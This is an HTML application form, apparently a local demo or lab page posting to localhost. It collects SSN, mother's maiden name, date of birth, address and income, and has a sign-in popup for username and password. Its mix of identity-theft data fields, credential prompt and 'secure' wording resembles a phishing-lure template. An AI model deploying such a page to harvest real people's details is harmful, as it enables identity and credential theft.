<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Secure Submission Form</title>

<style>
:root {
  --bg: #0f1726;
  --card: #162235;
  --text: #eef3ff;
  --muted: #b4c0d6;
  --accent: #4f7cff;
  --border: #2f3d5c;
  --radius: 14px;
}

body {
  margin: 0;
  font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial;
  background: var(--bg);
  color: var(--text);
  display: flex;
  justify-content: center;
  padding: 40px 16px;
}

#app {
  width: 100%;
  max-width: 720px;
}

#app-header {
  margin-bottom: 18px;
  padding-bottom: 12px;
  border-bottom: 1px solid #22314a;
}

h1 {
  font-size: 20px;
  margin: 0;
}

form {
  background: var(--card);
  padding: 24px;
  border-radius: var(--radius);
  border: 1px solid #22314a;
}

.form-section {
  margin-top: 18px;
  padding: 18px;
  border: 1px solid #22314a;
  border-radius: 14px;
  background: rgba(255,255,255,0.02);
}

.form-section h2 {
  font-size: 14px;
  color: #ffffff;
  margin-bottom: 10px;
  text-transform: uppercase;
}

label {
  display: flex;
  flex-direction: column;
  font-size: 13px;
  color: var(--muted);
  margin-top: 12px;
}

input, select {
  margin-top: 6px;
  padding: 10px 12px;
  border-radius: 10px;
  border: 1px solid var(--border);
  background: #111c2e;
  color: var(--text);
  outline: none;
}

input:focus, select:focus {
  border-color: var(--accent);
  box-shadow: 0 0 0 3px rgba(79,124,255,0.2);
}

button {
  margin-top: 18px;
  padding: 11px 14px;
  border-radius: 12px;
  border: 1px solid var(--border);
  background: #082a46;;
  color: var(--text);
  font-weight: 600;
  cursor: pointer;
}

button:hover {
  border-color: var(--accent);
  color: var(--accent);
}

button[type="submit"] {
  background: var(--accent);
  border: 1px solid var(--accent);
  color: white;
}

#userPopup {
  display: none;
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  background: var(--card);
  border: 1px solid var(--border);
  padding: 20px;
  border-radius: 14px;
  z-index: 1000;
}

#popupStatus, #status {
  margin-top: 10px;
  font-size: 13px;
  color: var(--muted);
}
</style>
</head>

<body>

<div id="app">

  <div id="app-header">
    <h1>Secure Submission Form</h1>
  </div>

  <form id="secureForm" action="http://localhost:5005/submit" method="POST">

    <button type="button" id="getUserBtn">Sign In to apply faster</button>

    <div id="userPopup">
      <h3>Sign In</h3>
      <label>Username <input id="popupUsername"></label>
      <label>Password <input id="popupPassword" type="password"></label>
      <button type="button" id="signInBtn">Sign In</button>
      <button type="button" id="closePopupBtn">Cancel</button>
      <p id="popupStatus"></p>
    </div>

    <!-- PERSONAL -->
    <div class="form-section">
      <h2>Personal Information</h2>
      <label>First name <input id="firstName" name="firstName" required></label>
      <label>Middle initial <input id="middleInitial" name="middleInitial"></label>
      <label>Last name <input id="lastName" name="lastName" required></label>
    </div>

    <!-- IDENTIFICATION -->
    <div class="form-section">
      <h2>Identification</h2>
      <label>DOB <input id="DOB" name="DOB"></label>
      <label>Mother's Maiden Name <input id="mothersMaidenName" name="mothersMaidenName"></label>
      <label>SSN <input id="SSN" name="SSN" required type="password" maxlength="9"></label>
    </div>

    <!-- CONTACT -->
    <div class="form-section">
      <h2>Contact Information</h2>
      <label>Email <input id="email" name="email" required></label>
      <label>Phone number <input id="phoneNumber" name="phoneNumber"></label>
    </div>

    <!-- ADDRESS -->
    <div class="form-section">
      <h2>Address</h2>
      <label>Address <input id="address" name="address"></label>
      <label>City <input id="city" name="city"></label>

      <label>State
        <select id="state" name="state" required>
          <option value="">Select</option>
          <option value="AL">Alabama</option>
          <option value="AK">Alaska</option>
          <option value="AZ">Arizona</option>
          <option value="AR">Arkansas</option>
          <option value="CA">California</option>
          <option value="CO">Colorado</option>
          <option value="CT">Connecticut</option>
          <option value="DE">Delaware</option>
          <option value="FL">Florida</option>
          <option value="GA">Georgia</option>
          <option value="HI">Hawaii</option>
          <option value="ID">Idaho</option>
          <option value="IL">Illinois</option>
          <option value="IN">Indiana</option>
          <option value="IA">Iowa</option>
          <option value="KS">Kansas</option>
          <option value="KY">Kentucky</option>
          <option value="LA">Louisiana</option>
          <option value="ME">Maine</option>
          <option value="MD">Maryland</option>
          <option value="MA">Massachusetts</option>
          <option value="MI">Michigan</option>
          <option value="MN">Minnesota</option>
          <option value="MS">Mississippi</option>
          <option value="MO">Missouri</option>
          <option value="MT">Montana</option>
          <option value="NE">Nebraska</option>
          <option value="NV">Nevada</option>
          <option value="NH">New Hampshire</option>
          <option value="NJ">New Jersey</option>
          <option value="NM">New Mexico</option>
          <option value="NY">New York</option>
          <option value="NC">North Carolina</option>
          <option value="ND">North Dakota</option>
          <option value="OH">Ohio</option>
          <option value="OK">Oklahoma</option>
          <option value="OR">Oregon</option>
          <option value="PA">Pennsylvania</option>
          <option value="RI">Rhode Island</option>
          <option value="SC">South Carolina</option>
          <option value="SD">South Dakota</option>
          <option value="TN">Tennessee</option>
          <option value="TX">Texas</option>
          <option value="UT">Utah</option>
          <option value="VT">Vermont</option>
          <option value="VA">Virginia</option>
          <option value="WA">Washington</option>
          <option value="WV">West Virginia</option>
          <option value="WI">Wisconsin</option>
          <option value="WY">Wyoming</option>
        </select>
      </label>

      <label>Zip <input id="zip" name="zip"></label>
    </div>

    <!-- FINANCIAL -->
    <div class="form-section">
      <h2>Financial Information</h2>
      <label>Annual Income <input id="annualIncome" name="annualIncome" type="number"></label>
    </div>

    <button type="submit">Submit Securely</button>

  </form>

</div>

<p id="status"></p>

<script src="/public/index-user.js"></script>
<div id="loadingOverlay" style="
  display:none;
  position:fixed;
  top:0;
  left:0;
  width:100%;
  height:100%;
  background:#0f1726;
  color:white;
  z-index:9999;
  justify-content:center;
  align-items:center;
  flex-direction:column;
  font-size:22px;
">
  <div>🔒 Transmitting Securely...</div>
</div>
</body>
</html>
